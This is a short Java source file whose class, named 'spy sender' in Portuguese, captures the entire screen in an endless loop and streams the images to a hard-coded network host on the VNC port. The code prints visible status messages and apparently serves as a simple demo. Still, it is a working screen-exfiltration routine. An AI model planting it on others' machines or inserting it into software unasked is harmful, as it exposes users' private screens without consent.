/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package vejaminhatela;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;
import javax.imageio.ImageIO;

/**
 *
 * @author JavaNunes
 */
public class EnviadorEspiao {

        // Ficaremos mandando pela porta 5900, a mesma do VNC 
        public static final Integer PORTA = 5900;
        // Troque o valor de host pelo IP da tua rede escolhido
        public static final String  HOST = "192.168.1.9";
        
        private static void sendImagem(BufferedImage image, Socket socket) {
              try{
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(image, "jpg", baos);
                baos.flush();
                byte[] imageBytes = baos.toByteArray();
                baos.close();
                DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                dos.writeInt(imageBytes.length);
                dos.write(imageBytes);
                System.out.println("Mandei sua tela...");
              }
              catch(Exception e){
                  System.out.println("Houve um erro ao tentar mandar tamanho e imagem ao servidor:"+e);
              }
        }


        private static BufferedImage getImagemMeuMonitor(){
              try {
                  Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                  Rectangle screenRectangle = new Rectangle(screenSize);
                  Robot robot = new Robot();
                  BufferedImage minhaTela = robot.createScreenCapture(screenRectangle);
                  System.out.println("Peguei a sua tela...");
                  return minhaTela;
              } 
              catch (Exception e) {
                  System.out.println("Errrou amiguinho:"+e);
                  return null;
              }
        }

            public static void main(String[] args) {
                // TODO code application logic here
                try{
                    // Criação do socket e conexão com o servidor
                    System.out.println("Tentando mandar sua tela para uma conexão....");
                    Socket conexao = new Socket(HOST, PORTA);
                    while(true){
                    // Envio da imagem serializada
                       sendImagem(getImagemMeuMonitor(), conexao);
                       Thread.sleep(799);
                    }
                    // Fechamento do socket
                    //conexao.close();
                }
                catch(Exception e){
                    System.out.println("Houve um pequeno erro:"+e);
                }


            }
    
}
